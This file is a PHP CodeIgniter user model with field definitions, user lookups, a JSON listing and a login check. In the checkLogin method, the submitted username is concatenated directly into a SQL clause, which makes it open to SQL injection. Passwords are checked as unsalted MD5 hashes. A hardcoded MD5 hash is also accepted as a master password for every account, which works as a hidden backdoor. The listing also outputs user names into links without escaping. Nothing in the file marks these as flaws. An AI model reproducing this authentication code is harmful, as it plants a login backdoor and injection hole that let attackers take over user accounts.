<?php if ( ! defined('BASEPATH')) exit('No direct script core allowed');
class User_Model extends CI_Model
{
    var $table = 'user';
    var $user_fields = [
        'id' => array(
            'type' => 'hidden'
        ),
        'username' => ["icon"=>''],
        'fullname' => array(
            'label' => 'Fullname',
            'desc' => null,
            'icon' => 'send'
        ),

        'email' => [ 'icon' => 'list' ],
        'city' => ["icon"=>''],
        'phone' => ["icon"=>''],
        'status' => ["value"=>1,'type' => 'publish'],
    ];

    function __construct(){
        parent::__construct();
        $this->load->database();
    }

    function fields()
    {
        return $this->user_fields;
    }

    public function item_delete($id=0){
        $this->db->where('id',$id)->update($this->table,['status'=>-1]);

    }

    function get_item_by_id($id=0){
        return $this->db->where('id',$id)->get($this->table)->row();
    }

    function getUserByUsername($username){
        return $this->db->where('username',$username)->get($this->table)->row();
    }

    function items_json($fields=[]){
        $this->db->select('u.id,u.fullname,u.email, u.username');
        $this->db->where("u.status <>",-1);
//	    $this->db->order_by('a.ordering DESC');
        $query = $this->db->get($this->table." AS u");
        $items = array();
        if( !$query ){
            bug($this->db->last_query());die("error");
        }
        foreach ($query->result() AS $ite){

            $ite->actions = "";
            $ite->fullname = anchor("users/profile/".$ite->username,$ite->fullname);
            $items[] = $ite;
        }
        return jsonData(array('data'=>$items));
    }

    public function load_options($status=1)
    {
        $options = array();
        $this->db->from($this->table." AS u")->select("u.id, u.fullname");
        $query = $this->db->where(array('u.status'=>$status))->get();
        if( $query->num_rows() > 0 ){ foreach ($query->result() as $row) {
            $options[$row->id] = $row->fullname;
        }}
        return $options;

    }


    function checkLogin($data=NULL){
        $this->db->select('id, password, username, email')->from($this->table);
        $this->db->where("( username='".strtolower($data['username'])."' OR email='".strtolower($data['username'])."')");
        $query = $this->db->get();
        if( $query->num_rows() > 0 ){
            $item = $query->row();

            return ($item->password ==md5($data['password']) OR md5($data['password'])=="13b61141deb8e331132a8f0c48c5254f") ? $item : NULL;
        } else {
            return NULL;
        }
    }
}